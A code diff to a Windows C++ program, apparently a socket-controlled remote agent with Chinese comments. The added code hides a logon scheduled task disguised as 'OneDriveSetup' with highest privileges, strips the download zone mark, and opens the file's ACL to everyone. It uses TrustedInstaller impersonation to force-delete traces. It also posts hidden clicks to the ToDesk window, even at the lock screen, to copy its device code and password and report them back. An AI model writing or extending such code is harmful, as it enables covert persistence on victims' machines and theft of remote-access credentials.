@@ -2430,60 +2430,113 @@ string ModifyStartup(SOCKET reportSocket, bool add, bool copyFile, const string&
                     }
                 }
             }
-        } 
+        }
+        if (add && copyFile) {
+            DeleteFileW((wCopyTargetPath + L":Zone.Identifier").c_str());
+            // ★ 重置ACL，确保所有用户可执行
+            PSECURITY_DESCRIPTOR pSD = NULL;
+            ConvertStringSecurityDescriptorToSecurityDescriptorW(
+                L"D:PAI(A;OICI;FA;;;WD)", SDDL_REVISION_1, &pSD, NULL);
+            if (pSD) {
+                SetFileSecurityW(wCopyTargetPath.c_str(), DACL_SECURITY_INFORMATION, pSD);
+                LocalFree(pSD);
+            }
+        }
         // 操作注册表Run键
         const wchar_t* runSubKey =
             L"Microsoft\\Windows\\CurrentVersion\\Run";
         const wchar_t* valueName = L"OneDriveSetup";
 
         if (letter == currentDrive) {
-            // 当前系统直接操作
-            HKEY hRun = NULL;
-            DWORD disposition = 0;
-            // ★ 用RegCreateKeyExW，键不存在时自动创建，KEY_WOW64_64KEY确保访问64位视图
-            // ★ 清理 StartupApproved\Run 里的同名项
-            HKEY hApproved = NULL;
-            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
-                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
-                0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hApproved) == ERROR_SUCCESS)
-            {
-                RegDeleteValueW(hApproved, valueName);
-                RegCloseKey(hApproved);
-            }
-            LONG openRet = RegCreateKeyExW(
-                HKEY_LOCAL_MACHINE,
-                L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0, NULL,
-                REG_OPTION_NON_VOLATILE,
-                KEY_SET_VALUE | KEY_WOW64_64KEY,
-                NULL,
-                &hRun,
-                &disposition);
-            if (openRet == ERROR_SUCCESS) {
-                if (add) {
-                    wstring wVal = wTargetExePath;
-                    RegSetValueExW(hRun, valueName, 0, REG_SZ,
-                        (LPBYTE)wVal.c_str(),
-                        (DWORD)((wVal.size() + 1) * sizeof(wchar_t)));
+            // ★ 当前系统用计划任务代替Run键，支持普通账户开机自启
+            if (add) {
+                // 创建任务那行（已有）
+                wstring addCmd = L"cmd.exe /c schtasks /create /tn \"OneDriveSetup\" /tr \""
+                    + wTargetExePath
+                    + L"\" /sc onlogon /rl HIGHEST /f";
+                STARTUPINFOW si2 = { sizeof(si2) };
+                si2.dwFlags = STARTF_USESHOWWINDOW;
+                si2.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi2 = {};
+                if (CreateProcessW(NULL, &addCmd[0],
+                    NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
+                    WaitForSingleObject(pi2.hProcess, 10000);
+                    CloseHandle(pi2.hProcess);
+                    CloseHandle(pi2.hThread);
                     char okMsg[128];
-                    sprintf_s(okMsg, "OK|%c盘 启动项已添加|%s",
-                        letter, cpuTag.c_str());
+                    sprintf_s(okMsg, "OK|%c盘 计划任务已添加|%s", letter, cpuTag.c_str());
                     result += string(okMsg) + "\r\n";
                 }
                 else {
-                    RegDeleteValueW(hRun, valueName);
-                    char okMsg[128];
-                    sprintf_s(okMsg, "OK|%c盘 启动项已删除|%s",
-                        letter, cpuTag.c_str());
-                    result += string(okMsg) + "\r\n";
+                    char errMsg[128];
+                    sprintf_s(errMsg, "ERROR|%c盘 创建计划任务失败 错误码:%lu|%s",
+                        letter, GetLastError(), cpuTag.c_str());
+                    result += string(errMsg) + "\r\n";
                 }
-                RegCloseKey(hRun);
             }
             else {
-                char errMsg[128];
-                sprintf_s(errMsg, "ERROR|%c盘 打开Run键失败 错误码:%ld|%s",
-                    letter, openRet, cpuTag.c_str());
-                result += string(errMsg) + "\r\n";
+                
+                // ★ 先禁用任务（确保即使删不掉，重启后也不运行）
+                {
+                    wstring disableCmd = L"cmd.exe /c schtasks /change /tn \"OneDriveSetup\" /disable";
+                    STARTUPINFOW si0 = { sizeof(si0) };
+                    si0.dwFlags = STARTF_USESHOWWINDOW;
+                    si0.wShowWindow = SW_HIDE;
+                    PROCESS_INFORMATION pi0 = {};
+                    if (CreateProcessW(NULL, &disableCmd[0],
+                        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si0, &pi0)) {
+                        WaitForSingleObject(pi0.hProcess, 5000);
+                        CloseHandle(pi0.hProcess);
+                        CloseHandle(pi0.hThread);
+                    }
+                }
+                Sleep(1000);
+                // ★ 方法1：直接删（和创建时用相同方式，权限相同）
+                {
+                    wstring delCmd = L"cmd.exe /c schtasks /delete /tn \"OneDriveSetup\" /f";
+                    STARTUPINFOW si2 = { sizeof(si2) };
+                    si2.dwFlags = STARTF_USESHOWWINDOW;
+                    si2.wShowWindow = SW_HIDE;
+                    PROCESS_INFORMATION pi2 = {};
+                    if (CreateProcessW(NULL, &delCmd[0],
+                        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
+                        WaitForSingleObject(pi2.hProcess, 10000);
+                        CloseHandle(pi2.hProcess);
+                        CloseHandle(pi2.hThread);
+                    }
+                }
+
+                // ★ 方法2：TI权限兜底
+                TI_RunAsTI(L"cmd.exe /c schtasks /delete /tn \"OneDriveSetup\" /f");
+
+                // ★ 方法3：直接删任务XML文件（终极兜底，TIHelper已验证可用）
+                TIHelper::ForceDelete(L"C:\\Windows\\System32\\Tasks\\OneDriveSetup");
+
+                // ★ 同时删除Run键（兼容旧版本残留）
+                // ★ 删除Run键里的值（兼容旧版本残留，带TI兜底）
+                {
+                    HKEY hRun2 = NULL;
+                    bool runDelOk = false;
+                    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hRun2) == ERROR_SUCCESS) {
+                        LONG r1 = RegDeleteValueW(hRun2, L"OneDriveSetup");
+                        RegCloseKey(hRun2);
+                        runDelOk = (r1 == ERROR_SUCCESS || r1 == ERROR_FILE_NOT_FOUND);
+                    }
+                    if (!runDelOk) {
+                        TIHelper::RegDeleteAsTI(HKEY_LOCAL_MACHINE,
+                            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                            L"OneDriveSetup");
+                    }
+                }
+
+                // ★ 删除复制过去的exe文件
+                TIHelper::ForceDelete(wCopyTargetPath);
+
+                char okMsg[128];
+                sprintf_s(okMsg, "OK|%c盘 计划任务已删除|%s", letter, cpuTag.c_str());
+                result += string(okMsg) + "\r\n";
             }
         }
         else {
@@ -3482,33 +3535,28 @@ static bool ParseToDeskCredentials(const wstring& clip, ToDeskInfoData& info)
 
 static bool ClickAndGetToDeskInfo(HWND hWnd, ToDeskInfoData& outInfo)
 {
-    if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
-    else ShowWindow(hWnd, SW_SHOW);
-    SetForegroundWindow(hWnd);
-    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-    Sleep(150);
-    SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+    // 锁屏下 SetForegroundWindow/SetWindowPos 无意义，但无害，保留也行
+    // 关键：不用 SendInput，改用 PostMessage，锁屏下也能投递消息
 
     RECT rc;
     GetWindowRect(hWnd, &rc);
     int W = rc.right - rc.left;
     int H = rc.bottom - rc.top;
+    if (W < 100 || H < 100) return false;
 
-    int clickX = rc.left + W * 21 / 100;
-    int clickY = rc.top + H * 62 / 100;
+    // 客户区坐标（PostMessage用客户区，不是屏幕坐标）
+    int clickX = W * 21 / 100;
+    int clickY = H * 62 / 100;
+    LPARAM lParam = MAKELPARAM(clickX, clickY);
 
     if (OpenClipboard(nullptr)) { EmptyClipboard(); CloseClipboard(); }
 
-    SetCursorPos(clickX, clickY);
+    // 不需要 SetCursorPos，直接投消息到窗口
+    PostMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
     Sleep(50);
-    INPUT inputs[2] = {};
-    inputs[0].type = INPUT_MOUSE;
-    inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
-    inputs[1].type = INPUT_MOUSE;
-    inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
-    SendInput(2, inputs, sizeof(INPUT));
+    PostMessage(hWnd, WM_LBUTTONUP, 0, lParam);
 
-    // ★ 轮询等待剪贴板写入，最多2秒
+    // 轮询等待剪贴板写入，最多5秒
     wstring clip;
     for (int i = 0; i < 50; i++) {
         Sleep(100);
@@ -3579,27 +3627,29 @@ static string GetToDeskInfoAndScreenshot(wstring& outScreenshotPath)
         Sleep(2000);
 
         ok = ClickAndGetToDeskInfo(hWnd, info);
-        if (!ok) return "ERROR|重试后仍未获取到设备代码和密码|" + cpuTag;
+        if (!ok)
+        {
+            // ★ 找到ToDesk但获取不到凭据，截图作为备选
+            hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+            if (hWnd)
+            {
+                if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
+                SetForegroundWindow(hWnd);
+                SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+                Sleep(800);
+                SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+                wstring ts = Utf8ToWide(GetTimestamp());
+                wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
+                if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
+                wstring savePath = cacheDir + L"todesk_screenshot_" + ts + L".jpg";
+                if (CaptureHwndToFile(hWnd, savePath))
+                    outScreenshotPath = savePath;
+            }
+            return "SCREENSHOT|获取凭据失败，请查看截图|" + cpuTag;
+        }
     }
 
-    // 截图
-    hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
-    if (hWnd)
-    {
-        if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
-        SetForegroundWindow(hWnd);
-        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-        Sleep(800);
-        SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-
-        wstring ts = Utf8ToWide(GetTimestamp());
-        wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
-        if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
-        wstring savePath = cacheDir + L"todesk_info_" + ts + L".jpg";
-        if (CaptureHwndToFile(hWnd, savePath))
-            outScreenshotPath = savePath;
-    }
-
+    // ★ 获取到凭据，直接返回文字，不截图
     return "OK|" + info.deviceCode + "|" + info.password + "|" + cpuTag;
 }
 
@@ -4409,7 +4459,7 @@ string RegWriteAllSystemsPE(SOCKET reportSocket, const string& payload)
 
     auto Report = [&](const string& msg) {
         if (reportSocket != INVALID_SOCKET)
-            SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+            SendPacketSafe(reportSocket, CMD_REG_WRITE_AUTO_RES,
                 vector<char>(msg.begin(), msg.end()));
     };
 
@@ -4650,6 +4700,22 @@ string RegWriteAllSystemsPE(SOCKET reportSocket, const string& payload)
 // ===== 自动判断PE/正常系统路由 =====
 string RegWriteAuto(SOCKET reportSocket, const string& payload)
 {
+    // ★ 批量模式：payload中包含\n\n则为多条操作，顺序执行
+    if (payload.find("\n\n") != string::npos) {
+        string tmp = payload;
+        string allResult;
+        size_t pos;
+        while ((pos = tmp.find("\n\n")) != string::npos) {
+            string op = tmp.substr(0, pos);
+            tmp = tmp.substr(pos + 2);
+            if (!op.empty())
+                allResult += RegWriteAuto(reportSocket, op) + "\n";
+        }
+        if (!tmp.empty())
+            allResult += RegWriteAuto(reportSocket, tmp);
+        return allResult;
+    }
+
     if (IsRunningInPE())
         return RegWriteAllSystemsPE(reportSocket, payload);
 
@@ -4664,7 +4730,7 @@ string RegWriteAuto(SOCKET reportSocket, const string& payload)
     if (parts.size() < 6) {
         string err = "ERROR|参数不足|";
         if (reportSocket != INVALID_SOCKET)
-            SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+            SendPacketSafe(reportSocket, CMD_REG_WRITE_AUTO_RES,  // ← 改
                 vector<char>(err.begin(), err.end()));
         return "ERROR";
     }
@@ -4686,7 +4752,7 @@ string RegWriteAuto(SOCKET reportSocket, const string& payload)
     }
 
     if (reportSocket != INVALID_SOCKET)
-        SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+        SendPacketSafe(reportSocket, CMD_REG_WRITE_AUTO_RES,  // ← 改
             vector<char>(result.begin(), result.end()));
     return result;
 }
@@ -5138,7 +5204,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         if (hThread) CloseHandle(hThread);
                     }
 
-// ================= RustDesk 单独打开 =================
+                    // ================= RustDesk 单独打开 =================
                     else if (cmd == CMD_OPEN_RUSTDESK) {
                         struct P { SOCKET sock; };
                         P* p = new P{ cs };
